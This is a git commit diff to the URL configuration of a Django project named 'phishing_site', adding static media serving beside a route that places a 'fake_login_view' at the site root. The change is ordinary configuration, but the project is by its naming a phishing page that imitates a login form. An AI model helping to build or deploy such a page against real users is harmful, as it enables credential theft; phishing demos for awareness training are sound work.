c424282cae0cb10cf8ca7338cfd9f7424a8755a8
AdnanAlrashed <adnanalrashed77@gmail.com>
2025-09-19 17:46:33 +0300

    static

--- phishing_site/urls.py
+++ phishing_site/urls.py
@@ -17,8 +17,10 @@ Including another URLconf
 from django.contrib import admin
 from django.urls import path
 from fake_login.views import fake_login_view
+from django.conf import settings
+from django.conf.urls.static import static
 
 urlpatterns = [
     path('admin/', admin.site.urls),
     path('', fake_login_view, name='fake_login'),
-]
+] + static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)
